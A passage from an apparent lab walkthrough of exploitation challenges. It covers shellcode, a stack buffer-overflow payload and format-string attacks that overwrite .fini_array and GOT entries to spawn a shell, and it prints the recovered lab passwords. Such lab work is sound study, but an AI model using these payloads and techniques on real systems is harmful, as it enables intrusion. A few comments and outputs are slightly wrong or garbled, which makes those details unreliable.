xchg eax, ecx                   ; put file name in ecx, zero out eax
mov al, 0x3                     ; sys_call(3) read_file
mov dl, 0x0c                    ; number of bytes to read
int 0x80

; print flag
xor eax, eax                    
xor ebx, ebx
mov bl, 1                       ; write to stdin
mov al, 4                       ; sys_call(4) write
int 0x80

; sys_close
xor eax, eax
xor ebx, ebx
mov al, 1                       ; sys_call(1) exit 
int 0x80
```

Syscall nums used in shellcode can be found like this:
``` bash
$ find /usr/include -type f | xargs grep -i -P  "__NR_read"
```

There's also a handy little tool called [shellnoob](https://github.com/reyammer/shellnoob) for these ones, who don't want to do it that circumstantially:

```
$ snoob --get-sysnum read
x86_64 ~> 0
i386 ~> 3
```
Now we are able to translate our human readable assembly information to some machine-code.

```
$ nasm -f elf32 /tmp/payload -o /tmp/payload.o
$ file payload.o
payload.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
$ ld -melf_i386 payload.o -o paylaod_shellcode
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
nasm -f elf32 /tmp/payload -o /tmp/payload.o
┌[holger@holger-H270M-DS3H] [/dev/pts/6] 
└[/tmp]> file payload.o
payload.o: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
$ ld -melf_i386 payload.o -o payload_shellcode
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048060
$ objdump -D -M intel paylaod_shellcode 

payload_shellcode:     Dateiformat elf32-i386

Disassembly of section .text:

08048060 <__bss_start-0x104c>:
 8048060:       31 c9                   xor    ecx,ecx
 8048062:       31 c0                   xor    eax,eax
 8048064:       31 d2                   xor    edx,edx
 8048066:       31 db                   xor    ebx,ebx
 8048068:       68 70 61 73 73          push   0x73736170
 804806d:       68 33 41 2f 2e          push   0x2e2f4133
 8048072:       68 2f 6c 61 62          push   0x62616c2f
 8048077:       68 68 6f 6d 65          push   0x656d6f68
 804807c:       68 42 42 42 2f          push   0x2f424242
 8048081:       83 c4 03                add    esp,0x3
 8048084:       89 e3                   mov    ebx,esp
 8048086:       c6 43 11 00             mov    BYTE PTR [ebx+0x11],0x0
 804808a:       b0 05                   mov    al,0x5
 804808c:       b2 04                   mov    dl,0x4
 804808e:       cd 80                   int    0x80
 8048090:       31 d2                   xor    edx,edx
 8048092:       93                      xchg   ebx,eax
 8048093:       91                      xchg   ecx,eax
 8048094:       b0 03                   mov    al,0x3
 8048096:       b2 0c                   mov    dl,0xc
 8048098:       cd 80                   int    0x80
 804809a:       31 c0                   xor    eax,eax
 804809c:       31 db                   xor    ebx,ebx
 804809e:       b3 01                   mov    bl,0x1
 80480a0:       b0 04                   mov    al,0x4
 80480a2:       cd 80                   int    0x80
 80480a4:       31 c0                   xor    eax,eax
 80480a6:       31 db                   xor    ebx,ebx
 80480a8:       b0 01                   mov    al,0x1
 80480aa:       cd 80                   int    0x80

$ objdump -D -M intel paylaod_shellcode | awk -F":" '{print $2}' | cut -d" " -f1,2,3,4,5 | tr -d "\t\n " | sed -e 's/\(..\)/\\x\1/g'
\x31\xc9\x31\xc0\x31\xd2\x31\xdb\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x42\x42\x42\x2f\x83\xc4\x03\x89\xe3\xc6\x43\x11\x00\xb0\x05\xb2\x04\xcd\x80\x31\xd2\x93\x91\xb0\x03\xb2\x0c\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80
```
You could also use radare for crafting shellcode for you:

```
$ r2 -w /tmp/garbage
[00000000]> waf /tmp/payload @ $$
Written 76 bytes (f /tmp/payload)=wx 31c931c031d231db68706173736833412f2e682f6c616268686f6d65684242422f83c40389e3c6431100b005b204cd8031d29391b003b20ccd8031c031dbb301b004cd8031c031dbb001cd80
```

There's also a pythonnic way to do that:

```python
from pwn import *

context.bits=32
asm("xor ecx, ecx; xor eax, eax")
[...]
```

Also Ruby offers a possibility to craft shellcode with its [metasm](https://github.com/jjyg/metasm) module:

```ruby
require 'metasm'

ass=File.read("/tmp/payload")
shellcode=Metasm::Shellcode.assemble(Metasm::Ia32.new, ass).encode_string
```

The first job now would be to produce a segfault and to determine offset to RIP:

```
$ strace -i -f "./lab3B" < <(ragg2 -P 256 -r)
[...]
[pid  1566] [32414131] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x32414131} ---
[...]
$ r2 --
[0x00000000]> woO 0x32414131
156
```
So offset to RIP is at offset 156. We have a 128 bytes buffer, so we know our shellcode can fit (78 bytes). Our payload now will look like this

* 52 bytes nopsled
* 78 bytes shellcode
* 28 bytes of padding
* 4 byte ret address

```
 python -c 'print "\x90"*52+"\x31\xc9\x31\xc0\x31\xd2\x31\xdb\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x42\x42\x42\x2f\x83\xc4\x03\x89\xe3\xc6\x43\x11\x00\xb0\x05\xb2\x04\xcd\x80\x31\xd2\x93\x91\xb0\x03\xb2\x0c\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80"+"A"*28+"\x10\xf6\xff\xbf"' > /tmp/lab3B
 ```

Our shellcode may work in gdb, but what will be outside of debugging environment? Again, ```strace``` runs at the user privilege, so we just have to keep lab3B's password file. Our goal here would be to decrement return address until we hit the spot.

A good trick for this is to prepend shellcode with bytes "\xeb\xef" (jmp back one byte). This causes an infinite loop, ```strace``` will hang and we can grab the right return address.

After doing all that, we can observe a beatiful password printed on stdout:

```
$ ./lab3B < /tmp/lab3B
just give me some shellcode, k
wh0_n33ds_5hchild is exiting...
```

## Pass Lab3A

```
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
```

## Lab 4C

Let's go a step further in exploiting format string bugs in ELF binaries.
Here's source-code:

```C
/*
 *   Format String Lab - C Problem
 *   gcc -z execstack -z norelro -fno-stack-protector -o lab4C lab4C.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PASS_LEN 30

int main(int argc, char *argv[])
{
    char username[100] = {0};
    char real_pass[PASS_LEN] = {0};
    char in_pass[100] = {0};
    FILE *pass_file = NULL;
    int rsize = 0;

    /* open the password file */
    pass_file = fopen("/home/lab4B/.pass", "r");
    if (pass_file == NULL) {
        fprintf(stderr, "ERROR: failed to open password file\n");
        exit(EXIT_FAILURE);
    }

    /* read the contents of the password file */
    rsize = fread(real_pass, 1, PASS_LEN, pass_file);
    real_pass[strcspn(real_pass, "\n")] = '\0';  // strip \n
    if (rsize != PASS_LEN) {
        fprintf(stderr, "ERROR: failed to read password file\n");
        exit(EXIT_FAILURE);
    }

    /* close the password file */
    fclose(pass_file);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("-----------------------------------------");
    puts("- You must login to access this system. -");
    puts("-----------------------------------------");

    /* read username securely */
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';    // strip \n

    /* read input password securely */
    printf("--[ Password: ");
    fgets(in_pass, sizeof(in_pass), stdin);
    in_pass[strcspn(in_pass, "\n")] = '\0';      // strip \n

    puts("-----------------------------------------");

    /* log the user in if the password is correct */
    if(!strncmp(real_pass, in_pass, PASS_LEN)){
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
    } else {
        printf(username);
```

Ok, here we observe, that if we don't use valid username for login, our input gets printed to stdout via ```printf()```. The major bug is that ```printf()``` will be supplied with username without using any format string for that. As a result we will be able to leak memory info from stack with providing our own format-string specifiers while being asked for correct username:

```
$ ./lab4C
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: %x%x%x%x
--[ Password:
-----------------------------------------
bffff5721e804a0080 does not have access!
```

So after testing a little bit, we observe that number of octets in stdout after providing crafter format-string is quite limited. After playing aroud with using direct parameter access, we can determine correct number of arguments to be 37:

```
$ ./lab4C
===== [ Secure Access System v1.0 ] =====
-----------------------------------------
- You must login to access this system. -
-----------------------------------------
--[ Username: AAAA%37$x
--[ Password:
-----------------------------------------
AAAA41414141 does not have access!
```

In source code, there's a line containing a call to libc's ```system()``` built_in. Interesting... Can we overwrite any address and mangle control-flow to call ```system()```. Yes we can! The program contains a section called "fini_array":

```
$ rabin2 -is lab4C | grep fini
vaddr=0x08049de4 paddr=0x00001de4 ord=033 fwd=NONE sz=0 bind=LOCAL type=OBJECT name=__do_global_dtors_aux_fini_array_entry
```
 Let's check if it's writable by the way:

 ```
$ readelf --sections lab4C | grep "fini"
  [14] .fini             PROGBITS        08048ba4 000ba4 000014 00  AX  0   0  4
  [19] .fini_array       FINI_ARRAY      08049de4 000de4 000004 00  WA  0   0  4
 ```

 The section is writable. If we would write address of ```system()``` call in binary's .text section to fini_array, shell will be spawned after we exited programs main-routine.
There are also multiple ways to achieve that with printf's %n parameter. I prefer the so called "short-write"-method, which overwrites two bytes of target address at time. This has the nice advantage of speeding up the process of overwriting an addressm as we need only only two operation sto do this:

* <overwrite address><overwrite-address+2>%<2 LSB target-address(lowest two bytes in decimal)>c$<argnum1>hn%<2 MSB target address(highest two bytes in decimal minus bytes already written)>$<argnum1+1>$hn

In that special case our payload will look like this:

```
$ rax2 0x8aeb - 8 
35555
$ rax2 0x10804-0x8aeb
32025
(python -c 'a="\xe4\x9d\x04\x08\xe6\x9d\x04\x08%35555x%37$hn%32025x%38$hn\npassword";print a'; cat) | ./lab4C
cat /home/lab4B/.pass
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

## Pass Lab4B

```
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```
## Lab 4B

```C
/*
 *   Format String Lab - B Problem
 *   gcc -z execstack -z norelro -fno-stack-protector -o lab4B lab4B.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    int i = 0;
    char buf[100];

    /* read user input securely */
    fgets(buf, 100, stdin);

    /* convert string to lowercase */
    for (i = 0; i < strlen(buf); i++)
        if (buf[i] >= 'A' && buf[i] <= 'Z')
            buf[i] = buf[i] ^ 0x20;
    /* print out our nice and new lowercase string */
    printf(buf);

    exit(EXIT_SUCCESS);
    return EXIT_FAILURE;
}
```
 In this challenge, the bug is quite obvious: 100 bytes of our input will be converted to lowercase and fed as argument to ```printf()```. Any input characters between ASCII 0x41 and 0x5a will be converted to lowercase. As a consequence we may pay attention to the fact that our input must not contain any uppercase characters. 
 In my opinion the easiest way to accomplish that chall would be to put our shellcode in environment, cause we just have 100 bytes room for wriggling.

Another fact we must keep in mind is, that cause of putting it's own environment variables on stack, gdb will shift it. Usually the shift is around 64 up to 120 bytes so far. 

```bash
export PAYL=$(echo $'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80')
``` 
Additionally I would like to introduce a nice method of examing environment variables in gdb:
```
gdb-peda$ x/10s *(void**)environ
0xbffff8a4:     "PAYL=", '\220' <repeats 16 times>, "\061\311\367\341\260\v\273$:\370\267\315\200"
[...]
```
Here's the disassembly of the shellcode used above:

```
0x00000010    31c9           xor ecx, ecx                                                                                            
0x00000012    f7e1           mul ecx                                                                                                 
0x00000014    b00b           mov al, 0xb                    ; 11                                                                     
0x00000016    bb243af8b7     mov ebx, 0xb7f83a24                                                                                     
0x0000001b    cd80           int 0x80
```

What's at 0xb7f83a24? 

```
$ r2 -d ./lab4B
[0x0804868d]> db main
[0x0804868d]> dc
[0x0804868d]> ps @ 0xb7f83a24
/bin/sh
```

OK. So let's take a look at the possible targets:

```
$ checksec lab4B
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       lab4B
```
No RELRO sos let's take a closer look at the GOT entries

```
$ readelf --relocs ./lab4B

Relocation section '.rel.dyn' at offset 0x4bc contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804999c  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
080499cc  00001005 R_386_COPY        080499cc   stdin

Relocation section '.rel.plt' at offset 0x4cc contains 6 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080499ac  00000207 R_386_JUMP_SLOT   00000000   printf
080499b0  00000307 R_386_JUMP_SLOT   00000000   fgets
080499b4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
080499b8  00000507 R_386_JUMP_SLOT   00000000   exit
080499bc  00000607 R_386_JUMP_SLOT   00000000   strlen
080499c0  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
```
Is there a call to exit after our input has been fed to ```printf()```? 

```
0x08048724    e807feffff     call sym.imp.printf 
0x08048729    c70424000000.  mov dword [esp], 0                                                                                      
0x08048730    e82bfeffff     call sym.imp.exit
```

An overwrite of exit's GOT entry with the right address positioned in NOPsled will result in shell...

```bash
(echo $'\xb8\x99\x04\x08\xba\x99\x04\x08%63563x%6$hn%51116x%7$hn'; cat) | ./lab4B
```

There's also a handy python lib called [libformatstr](https://github.com/hellman/libformatstr) which eases construction of attack strings wwithous tedious calculations:

```python
from libformatstr import *

got_exit=0x80499b8
shellcode_address=0xbffff68a
argnum=6
padding=0

fmt=FormatStr()
fmt[got_exit]=shellcode_address

print repr(fmt.payload(argnum,padding))

```
## Pass Lab4A

```
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

